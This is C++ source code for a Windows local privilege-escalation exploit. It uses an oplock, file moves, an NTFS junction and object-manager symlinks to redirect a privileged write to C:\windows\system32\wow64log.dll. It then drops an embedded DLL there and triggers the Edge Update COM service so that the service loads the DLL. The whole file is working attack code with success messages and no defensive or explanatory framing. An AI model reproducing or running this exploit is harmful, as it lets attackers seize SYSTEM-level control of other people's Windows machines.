#include "def.h"

int wmain()
{

	load();

	Trigger();
	HANDLE hFile = INVALID_HANDLE_VALUE;
	do {
		Sleep(1000);
		hFile = CreateFile(L"C:\\windows\\system32\\wow64log.dll", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	} while (hFile == INVALID_HANDLE_VALUE);
	printf("[+] Exploit successful!\n");
	HMODULE hm = GetModuleHandle(NULL);
	HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_DLL1), L"dll");
	DWORD DllSize = SizeofResource(hm, res);
	void* DllBuff = LoadResource(hm, res);
	WriteFile(hFile, DllBuff, DllSize, NULL, NULL);
	CloseHandle(hFile);
	
	printf("[*] Triggering Edge Update service!\n");
	HRESULT coini = CoInitialize(NULL);
	IGoogleUpdate* updater = NULL;

	HRESULT hr = CoCreateInstance(__uuidof(CLSID_MSEdge_Object), NULL, CLSCTX_LOCAL_SERVER, __uuidof(updater), (PVOID*)&updater);
	while (!DeleteFile(L"C:\\windows\\system32\\wow64log.dll")) {}
	return 0;

}


BOOL Move(HANDLE hFile) {
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] Invalid handle!\n");
		return FALSE;
	}
	wchar_t tmpfile[MAX_PATH] = { 0x0 };
	RPC_WSTR str_uuid;
	UUID uuid = { 0 };
	UuidCreate(&uuid);
	UuidToString(&uuid, &str_uuid);
	_swprintf(tmpfile, L"\\??\\C:\\windows\\temp\\%s", str_uuid);
	
	size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
	FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
	IO_STATUS_BLOCK io = { 0 };
	rename_info->ReplaceIfExists = TRUE;
	rename_info->RootDirectory = NULL;
	rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
	rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
	memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
	NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
	if (status != 0) {
		return FALSE;
	}
	return TRUE;
}


HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion, ULONG createoption) {
	UNICODE_STRING ufile;
	HANDLE hDir;
	NTSTATUS retcode;
	ULONG options = FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT;
	options != createoption;
	pRtlInitUnicodeString(&ufile, file);
	OBJECT_ATTRIBUTES oa = { 0 };
	IO_STATUS_BLOCK io = { 0 };
	
	InitializeObjectAttributes(&oa, &ufile, OBJ_CASE_INSENSITIVE, NULL, NULL);

	retcode = pNtCreateFile(&hDir, access, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion, options, NULL, NULL);

	if (!NT_SUCCESS(retcode)) {
		SetLastError(retcode);
		return NULL;
	}
	return hDir;
}
HANDLE myCreateFile(LPCWSTR file, DWORD access, DWORD share, DWORD dispostion,HANDLE root,ULONG createoption) {
	UNICODE_STRING ufile;
	HANDLE hFile;
	NTSTATUS retcode;
	ULONG options = FILE_NON_DIRECTORY_FILE;
	options |= createoption;
	pRtlInitUnicodeString(&ufile, file);
	OBJECT_ATTRIBUTES oa = { 0 };
	IO_STATUS_BLOCK io = { 0 };

	InitializeObjectAttributes(&oa, &ufile, OBJ_CASE_INSENSITIVE, root, NULL);

	retcode = pNtCreateFile(&hFile, access, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion,options, NULL, NULL);

	if (!NT_SUCCESS(retcode)) {
		SetLastError(retcode);
		return NULL;
	}
	return hFile;
}
LPWSTR  BuildPath(LPCWSTR path) {
	wchar_t ntpath[MAX_PATH];
	swprintf(ntpath, L"\\??\\%s", path);
	return ntpath;
}
void load() {
	HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
	if (ntdll != NULL) {
		pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
		pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
		pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");

	}
	if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL) {
		printf("Cannot load api's %d\n", GetLastError());
		exit(0);
	}

}
BOOL CreateJunction(HANDLE hDir, LPCWSTR target) {
	DWORD cb;
	wchar_t printname[] = L"";
	if (hDir == INVALID_HANDLE_VALUE) {
		printf("[!] HANDLE invalid!\n");
		return FALSE;
	}
	SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
	SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
	SIZE_T PathLen = TargetLen + PrintnameLen + 12;
	SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
	PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
	Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	Data->ReparseDataLength = PathLen;
	Data->Reserved = 0;
	Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
	Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
	memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
	Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
	Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
	memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);
	WCHAR dir[MAX_PATH] = { 0x0 };
	if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
	{

		GetFinalPathNameByHandle(hDir, dir, MAX_PATH, 0);
		printf("[+] Junction %ls -> %ls created!\n", dir, target);
		free(Data);
		return TRUE;

	}
	else
	{

		printf("[!] Error: %d. Exiting\n", GetLastError());
		free(Data);
		return FALSE;
	}
}
BOOL DeleteJunction(HANDLE handle) {
	REPARSE_GUID_DATA_BUFFER buffer = { 0 };
	BOOL ret;
	buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	DWORD cb = 0;
	IO_STATUS_BLOCK io;
	if (handle == INVALID_HANDLE_VALUE) {
		printf("[!] HANDLE invalid!\n");
		return FALSE;
	}
	WCHAR dir[MAX_PATH] = { 0x0 };
	if (DeviceIoControl(handle, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL)) {
		GetFinalPathNameByHandle(handle, dir, MAX_PATH, 0);
		printf("[+] Junction %ls deleted!\n", dir);
		return TRUE;
	}
	else
	{
		printf("[!] Error: %d.\n", GetLastError());
		return FALSE;
	}
}
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
		printf("[+] Symlink %ls -> %ls created!\n", object, target);
		return TRUE;

	}
	else
	{
		printf("error :%d\n", GetLastError());
		return FALSE;

	}
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
		printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
		return TRUE;

	}
	else
	{
		printf("error :%d\n", GetLastError());
		return FALSE;


	}
}
VOID cb0() {
	printf("[+] Oplock triggered!\n");
	DWORD read;
	LPWSTR path = FindDirectory();
	myCreateDirectory(BuildPath(path), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF,0);
	
	WCHAR file[MAX_PATH] = { 0x0 };
	while (!Move(hFile)) {};
	printf("[+] File moved!\n");
	wsprintf(file, L"\\??\\%s\\1.xml.tmp", path);
	DosDeviceSymLink(L"Global\\GLOBALROOT\\RPC Control\\1.xml.tmp", file);
	DosDeviceSymLink(L"Global\\GLOBALROOT\\RPC Control\\1.xml", L"\\??\\C:\\windows\\system32\\wow64log.dll");
	CreateJunction(hDir, L"\\RPC Control");

}

LPWSTR FindDirectory(){
	LPWSTR username;
	DWORD szUsername = 0;
	WCHAR* path = (WCHAR*)malloc(MAX_PATH * 2);
	RPC_WSTR str_uuid;
	UUID uuid = { 0x0 };

	UuidCreate(&uuid);
	UuidToString(&uuid, &str_uuid);
	GetUserName(NULL, &szUsername);
	username = (LPWSTR)malloc(szUsername);
	GetUserName(username, &szUsername);
	memset(path, 0x0, (MAX_PATH * 2));
	swprintf(path, L"C:\\users\\%s\\appdata\\local\\temp\\%s", username, str_uuid);
	free(username);
	return path;
	
}
void Trigger() {


	LPWSTR path =FindDirectory();
	printf("[*] File to export the macro: %ls\\1.xml\n",path);
	hDir = myCreateDirectory(BuildPath(path), GENERIC_WRITE|DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF,FILE_FLAG_DELETE_ON_CLOSE);
	if (hDir == NULL) {
		printf("[!] Failed to create directory %ls\n", path);
		exit(1);
	}
	free(path);

	FileOpLock* oplock;
	do {
		hFile = myCreateFile(L"1.xml.tmp", GENERIC_READ | DELETE|SYNCHRONIZE, FILE_SHARE_READ, FILE_OPEN_IF, hDir,0);
		
	} while (hFile == NULL);
	oplock = FileOpLock::CreateLock(hFile, cb0);
	if (oplock != nullptr) {
		oplock->WaitForLock(INFINITE);

	}
}
